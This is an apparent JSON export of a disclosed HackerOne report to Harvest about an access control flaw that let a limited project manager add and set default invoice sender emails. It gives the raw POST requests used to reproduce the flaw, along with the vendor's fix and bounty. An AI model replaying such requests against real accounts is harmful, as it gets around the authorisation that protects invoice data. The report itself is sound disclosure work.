{"id":158979,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTg5Nzk=","url":"https://hackerone.com/reports/158979","title":"PM with can Set up email for invoices and estimates (Access control Issue)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-13T05:23:52.255Z","submitted_at":"2016-08-13T05:23:52.255Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"indoappsec","url":"/indoappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":237,"url":"https://hackerone.com/harvest","handle":"harvest","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Harvest","twitter_handle":"","website":"http://getharvest.com","about":"Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-29T23:02:59.606Z","bug_reporter_agreed_on_going_public_at":"2016-08-30T23:02:55.056Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\nDescription : Project Manager With limited access Invoices and estimates don't have access to Company information. In the company Information there is a option of adding an Email to send invoices and estimations. The limited access Project manager should not be able to Access this sections and shouldn't be able to add the email to send invoices on that.\nBut the Adding Email HTTP request have some access control issues.Hence it let's the Project manager (with limited) to Add new email . \n\nSteps to reproduce : \n1.Create a New account with Owner(UserA) and add a Project manager(Attacker) where he doesn't have access to invoices and addition features.\n2.Open the Project Manager's account and you will see that he's not able to access the Invoice and estimation section where you can change the company info.\n3.Run the Below Mentioned HTTP request  From any proxy tool : \n\nPOST /sender_emails HTTP/1.1\nHost: vijaygangani.harvestapp.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://vijaygangani.harvestapp.com/invoices/configure\nContent-Length: 287\nCookie: [Cookie_values]\nConnection: keep-alive\n\nutf8=%E2%9C%93\u0026url_hash=thank_you_email\u0026sender_email%5Bname%5D=[Sender's Name]\u0026sender_email%5Bemail%5D=[Email]\u0026authenticity_token=[Token_Value]\u0026x_requested_with=XMLHttpRequest\n\n4.After sending  this Request to server ,It won't check the access and The verification email will be sent to your mentioned email in the HTTP request. \n5. Now Attacker can go to the email and add his email by verifying the email.\n\nNote : The above Mentioned HTTP request can be get by below mentioned link and add email :  https://vijaygangani.harvestapp.com/invoices/configure#company_information_edit\n\n\nImpact :  Any Project Manager with limited access can add his own email to get All the estimation and invoice Details.\n\nLet me know if you need Video POC or any other information regarding this issue.\n\nBest Regards !\nVijay Kumar \n\n\n\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-29T23:02:55.168Z","allow_singular_disclosure_after":-158769854.6262458,"singular_disclosure_allowed":true,"vote_count":10,"voters":["thisishrsh","dmatrix","vijay_kumar","dilawer01","jens","jbbbkj","sumit7","oldzk34911","nigba","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1141830,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jorgeleria : I haven't got any of the response for all the submitted issues. Can you give any ETA for these issues ?","automated_response":false,"created_at":"2016-08-20T02:44:24.449Z","updated_at":"2016-08-20T02:44:24.449Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1144424,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Vijay,\n\nThanks for your patience! You will get an answer to all your reports during this week.\n\nAs for this one I just verified it, we are going to fix it and we will be awarding a bounty.\nI'll contact you as soon as it is fixed!\n\nBest regards,\nJorge\n","automated_response":false,"created_at":"2016-08-22T11:30:32.303Z","updated_at":"2016-08-22T11:30:32.303Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1145617,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jorgeleria  : Thanks for response. As you said you are merging the  #158982 issue in this. I would like to add one more slimier issue here. Project manager can change the default mail in configurations.\n\nLink : https://vijaygangani.harvestapp.com/estimates/configure\n\nHTTP request : \n\nPOST /sender_emails/make_default/48848 HTTP/1.1\nHost: vijaygangani.harvestapp.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://vijaygangani.harvestapp.com/estimates/configure\nContent-Length: 143\nCookie: [Cookie_Value]\nConnection: keep-alive\n\nauthenticity_token=\u0026x_requested_with=XMLHttpRequest \n\nKindly Add this Issue in this report and let me know if you need any other help from my side.\n\n\nBest Regards !\nVijay Kumar \n ","automated_response":false,"created_at":"2016-08-22T19:16:38.073Z","updated_at":"2016-08-22T19:16:38.073Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1159981,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi Vijay,\n\nThis should be fixed!\nCould you check if you are able to reproduce it now?\n\nThanks,\nJorge","automated_response":false,"created_at":"2016-08-29T15:25:53.411Z","updated_at":"2016-08-29T15:25:53.411Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"indoappsec","url":"/indoappsec"},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1162673,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping make Harvest more secure!","automated_response":false,"created_at":"2016-08-30T16:51:01.995Z","updated_at":"2016-08-30T16:51:01.995Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Harvest"}},"bounty_amount":"250.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"harvest","collaborator":{"username":"indoappsec","url":"/indoappsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163621,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-08-30T23:02:55.104Z","updated_at":"2016-08-30T23:02:55.104Z","first_to_agree":true,"actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1223850,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-09-29T15:53:20.882Z","updated_at":"2016-09-29T15:53:20.882Z","additional_data":{"old_title":"Project Manager with limited access to company information can Set up Email for invoices and estimates(Access control Issue)","new_title":"PM with can Set up email for invoices and estimates (Access control Issue)"},"actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224814,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-09-29T23:02:59.652Z","updated_at":"2016-09-29T23:02:59.652Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Harvest"}},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}